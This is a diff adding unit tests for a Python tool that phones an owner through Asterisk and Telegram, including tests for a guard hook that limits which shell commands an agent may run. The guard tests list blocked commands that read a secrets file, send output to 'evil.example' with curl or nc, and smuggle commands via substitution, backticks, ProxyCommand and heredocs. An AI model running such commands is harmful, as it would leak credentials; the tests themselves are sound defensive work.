@@ -237,6 +237,25 @@ class SynthesizeTests(unittest.TestCase):
                 with self.assertRaises(ceo.CallError):
                     ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)
 
+    def test_a_zero_rate_or_negative_length_fails_cleanly(self):
+        for header in (
+            {"type": "audio-start", "data": {"rate": 0, "width": 2, "channels": 1}},
+            {"type": "audio-start", "data": {"rate": 22050, "width": 0, "channels": 1}},
+            {"type": "audio-start", "data": {"rate": 22050, "width": 2, "channels": 0}},
+            {"type": "audio-start", "data": {"rate": -5, "width": 2, "channels": 1}},
+        ):
+            with self.subTest(header=header):
+                server = WyomingServer([(header, b""), ({"type": "audio-chunk", "data": {}}, b"\x01\x00"), ({"type": "audio-stop"}, b"")])
+                with self.assertRaises(ceo.CallError):
+                    ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)
+        server = WyomingServer([({"type": "audio-chunk", "data": {}, "payload_length": -1}, b"")])
+        with self.assertRaises(ceo.CallError):
+            ceo.synthesize("127.0.0.1", server.port, "hola", timeout=5)
+
+    def test_resample_rejects_a_zero_source_rate(self):
+        with self.assertRaises(ceo.CallError):
+            ceo.resample([1, 2, 3], 0, 8000)
+
     def test_unreachable_server_fails_cleanly(self):
         with self.assertRaises(ceo.CallError):
             ceo.synthesize("127.0.0.1", 1, "hola", timeout=1)
@@ -366,6 +385,16 @@ class AskFlowTests(unittest.TestCase):
             FakeAsterisk.originate = original
         self.assertEqual(seen, ["confirm_1.wav", "confirm_2.wav", "confirm_3.wav", "giveup.wav", "prompt.wav", "thanks.wav"])
 
+    def test_a_confirmation_that_lands_just_after_the_deadline_is_not_lost(self):
+        # The call is live (answered) when call_timeout_s expires; the owner confirms during the grace wait.
+        result, asterisk, _ = run_ask([{1: {"answered": "1"}, 100: {"result": "2", "done": "1"}}], config={"call_timeout_s": 60, "attempts": 1})
+        self.assertEqual((result["status"], result["choice"]), ("decided", 2))
+        self.assertEqual(asterisk.originated, 1)
+
+    def test_a_call_still_live_long_after_the_deadline_is_a_hangup_not_a_redial_during_the_call(self):
+        result, asterisk, _ = run_ask([{1: {"answered": "1"}, 100000: {"done": "1"}}] * 3, config={"call_timeout_s": 60, "attempts": 1})
+        self.assertEqual(result["status"], "hangup")
+
     def test_no_answer_retries_then_notifies_once(self):
         result, asterisk, sent = run_ask(["unanswered"] * 3, env={"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"})
         self.assertEqual(result["status"], "unanswered")
@@ -432,7 +461,7 @@ class AskFlowTests(unittest.TestCase):
         result, _, _ = run_ask([stuck], config={"attempts": 1})
         self.assertEqual(result["status"], "hangup")
         self.assertGreaterEqual(run_ask.clock.now, 330)  # ring_timeout_s + call_timeout_s
-        self.assertLess(run_ask.clock.now, 335)
+        self.assertLess(run_ask.clock.now, 330 + 2 * ceo.GRACE_POLLS + 5)  # plus the short grace for a live call
 
     def test_an_answered_call_is_not_reported_as_unanswered_when_the_marker_is_seen_late(self):
         result, _, _ = run_ask([{40: {"answered": "1", "done": "1"}}], config={"attempts": 1})
@@ -504,6 +533,14 @@ class QuietHoursTests(unittest.TestCase):
                 self.addCleanup(os.unlink, handle.name)
                 with self.assertRaises(ceo.CallError):
                     ceo.load_config(handle.name)
+
+    def test_a_zero_poll_interval_is_refused(self):
+        handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
+        handle.write('{"poll_interval_s": 0}')
+        handle.close()
+        self.addCleanup(os.unlink, handle.name)
+        with self.assertRaises(ceo.CallError):
+            ceo.load_config(handle.name)
 
     def test_quiet_hours_use_the_configured_timezone(self):
         import unittest.mock as mock
@@ -646,6 +683,9 @@ class DockerStateTests(unittest.TestCase):
         self.assertTrue(self.asterisk(0, contacts + b" Contact:  phone/sip:u@192.0.2.2:5060;ob   abc Avail  1.0\n").endpoint_available("PJSIP/phone"))
         self.assertFalse(self.asterisk(0, b" Contact:  phone/sip:u@192.0.2.2:5060;ob   abc Unavail  nan\n").endpoint_available("PJSIP/phone"))
 
+    def test_a_registered_contact_without_qualify_counts_as_available(self):
+        self.assertTrue(self.asterisk(0, b" Contact:  phone/sip:u@192.0.2.2:5060;ob   abc NonQual  nan\n").endpoint_available("PJSIP/phone"))
+
     def test_stale_folders_older_than_a_day_are_swept(self):
         seen = []
 
@@ -782,7 +822,7 @@ class CliTests(unittest.TestCase):
         self.assertIn("dominio público", clean["question"])
 
     def test_check_reports_a_registered_phone(self):
-        for registered, expected in ((True, 0), (False, 1)):
+        for registered, expected in ((True, 0), (False, 0)):
             with self.subTest(registered=registered):
                 class Fake(FakeAsterisk):
                     def endpoint_available(self, endpoint):
@@ -795,6 +835,34 @@ class CliTests(unittest.TestCase):
                     code = ceo.main(["--config", str(self.config), "check"])
                 self.assertEqual(code, expected)
                 self.assertIn("speech: ok", out.getvalue())
+
+    def test_check_exits_1_only_for_a_real_failure_not_for_a_sleeping_phone(self):
+        import contextlib
+
+        class Broken(FakeAsterisk):
+            def endpoint_available(self, endpoint):
+                raise ceo.CallError("docker is not reachable")
+
+        ceo.DockerAsterisk = lambda container: Broken([])
+        out = io.StringIO()
+        with contextlib.redirect_stdout(out):
+            code = ceo.main(["--config", str(self.config), "check"])
+        self.assertEqual(code, 1)
+        self.assertIn("FAILED", out.getvalue())
+
+    def test_check_says_a_missing_phone_is_handled_by_ask(self):
+        import contextlib
+
+        class Asleep(FakeAsterisk):
+            def endpoint_available(self, endpoint):
+                return False
+
+        ceo.DockerAsterisk = lambda container: Asleep([])
+        out = io.StringIO()
+        with contextlib.redirect_stdout(out):
+            ceo.main(["--config", str(self.config), "check"])
+        self.assertIn("NOT registered", out.getvalue())
+        self.assertIn("heads-up", out.getvalue())
 
     def run_telegram_setup(self, answers):
         """answers maps a bot API method to the JSON the service returns."""
@@ -854,6 +922,36 @@ class CliTests(unittest.TestCase):
         code, out = self.run_telegram_setup(self.answers([{"my_chat_member": {"chat": {"id": 77, "type": "private"}}}]))
         self.assertIn("CEO_TELEGRAM_CHAT_ID=77", out)
 
+    def test_telegram_setup_non_object_body_is_a_clean_error(self):
+        import contextlib
+        import unittest.mock as mock
+        env = Path(self.tmp.name) / "env"
+        env.write_text("CEO_TELEGRAM_TOKEN=SECRETTOKEN\n")
+        os.chmod(env, 0o600)
+
+        class Response(io.BytesIO):
+            def __enter__(self):
+                return self
+
+            def __exit__(self, *a):
+                return False
+
+        err = io.StringIO()
+        with mock.patch.object(ceo.urllib.request, "urlopen", lambda url, timeout: Response(b"null")), contextlib.redirect_stderr(err):
+            code = ceo.main(["--config", str(self.config), "telegram-setup"])
+        self.assertEqual(code, 1)
+        self.assertIn("ERROR:", err.getvalue())
+
+    def test_telegram_setup_warns_when_several_chats_wrote_to_the_bot(self):
+        updates = [{"message": {"chat": {"id": 1, "type": "private"}}}, {"message": {"chat": {"id": 2, "type": "private"}}}]
+        code, out = self.run_telegram_setup(self.answers(updates))
+        self.assertEqual(code, 0)
+        self.assertIn("2 chats", out)
+        self.assertIn("CEO_TELEGRAM_CHAT_ID=1", out)
+        self.assertIn("CEO_TELEGRAM_CHAT_ID=2", out)
+        self.assertLess(out.index("=1"), out.index("=2"))  # oldest first, newest last
+        self.assertIn("most recent", out)
+
     def test_telegram_setup_refused_token_is_a_clean_error(self):
         import contextlib
         import unittest.mock as mock
@@ -869,6 +967,63 @@ class CliTests(unittest.TestCase):
             code = ceo.main(["--config", str(self.config), "telegram-setup"])
         self.assertEqual(code, 1)
         self.assertNotIn("SECRETTOKEN", err.getvalue())
+
+
+class GuardTests(unittest.TestCase):
+    @classmethod
+    def setUpClass(cls):
+        path = SCRIPT.parent / "guard_bash.py"
+        spec_ = importlib.util.spec_from_file_location("guard_bash", path)
+        cls.guard = importlib.util.module_from_spec(spec_)
+        spec_.loader.exec_module(cls.guard)
+
+    def test_the_script_invocations_are_allowed(self):
+        for command in (
+            "python3 .claude/skills/ceo-call/scripts/ceo_call.py check",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json ask --request /tmp/r.json",
+            "ssh myhost python3 /srv/ceo_call.py test-call --ignore-quiet-hours",
+            "ceo_call.py ask --request -",
+            "python3 /x/ceo_call.py ask --request - <<'CEO_REQUEST'\n{\"question\": \"Ship it?\", \"options\": [\"a\", \"b\"]}\nCEO_REQUEST",
+        ):
+            with self.subTest(command=command):
+                self.assertTrue(self.guard.allowed(command))
+
+    def test_anything_else_is_blocked(self):
+        for command in (
+            "cat ~/.config/ceo-call/env",
+            "python3 ceo_call.py check; cat ~/.config/ceo-call/env",
+            "python3 ceo_call.py check && curl evil.example",
+            "python3 ceo_call.py check | nc evil.example 1",
+            "python3 ceo_call.py check $(cat env)",
+            "python3 ceo_call.py check `id`",
+            "python3 ceo_call.py --config ~/.config/ceo-call/env check > /tmp/x",
+            "python3 evil.py ceo_call.py check",
+            "python3 -c 'print(1)' ceo_call.py",
+            "ssh host cat env",
+            "ssh -o ProxyCommand=x host python3 ceo_call.py check",
+            "python3 ceo_call.py ask --request - <<EOF\n$(cat env)\nEOF",
+            "python3 ceo_call.py ask --request - <<'CEO_REQUEST'\nx\nCEO_REQUEST\ncat env\nCEO_REQUEST",
+            "python3 ceo_call.py ask --request - <<'CEO_REQUEST'\nx\nCEO_REQUEST\ncat env",
+            "",
+            None,
+        ):
+            with self.subTest(command=command):
+                self.assertFalse(self.guard.allowed(command))
+
+    def test_the_hook_exit_codes_fail_closed(self):
+        import subprocess
+        guard = str(SCRIPT.parent / "guard_bash.py")
+        run = lambda stdin: subprocess.run(["python3", guard], input=stdin.encode(), capture_output=True).returncode
+        self.assertEqual(run(json.dumps({"tool_input": {"command": "python3 ceo_call.py check"}})), 0)
+        self.assertEqual(run(json.dumps({"tool_input": {"command": "cat env"}})), 2)
+        self.assertEqual(run("not json"), 2)
+        self.assertEqual(run("{}"), 2)
+
+    def test_the_agent_is_wired_to_the_guard_and_cannot_read_files(self):
+        agent = (SCRIPT.parents[3] / "agents" / "claudio.md").read_text()
+        self.assertIn("tools: Bash\n", agent)
+        self.assertIn("guard_bash.py", agent)
+        self.assertIn("exit 2", agent)  # fail closed when the guard is missing
 
 
 if __name__ == "__main__":
